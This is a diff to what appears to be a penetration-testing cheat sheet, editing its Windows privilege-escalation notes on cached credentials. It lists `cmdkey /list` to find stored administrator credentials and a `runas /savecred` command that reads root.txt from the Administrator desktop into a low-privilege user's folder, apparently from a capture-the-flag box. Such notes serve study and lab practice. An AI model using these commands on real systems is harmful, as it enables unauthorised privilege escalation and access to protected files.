@@ -266,12 +266,15 @@ Windows privesc:
     * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
     
 Cached Credentials:
-```
-$ cmdkey /list      # check for stored creds
-    Target: Domain:interactive=ACCESS\Administrator
-    Type: Domain Password
-    User: ACCESS\Administrator
-$ runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe"
+```powershell
+# CMDKEY: https://ss64.com/nt/cmdkey.html
+$ cmdkey /list      
+    # Target: Domain:interactive=ACCESS\Administrator
+    # Type: Domain Password
+    # User: ACCESS\Administrator
+
+# RUNAS: https://ss64.com/nt/runas.html
+$ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administrator\Desktop\root.txt>C:\Users\noob\out.txt"
 ```
 
 Nestat:
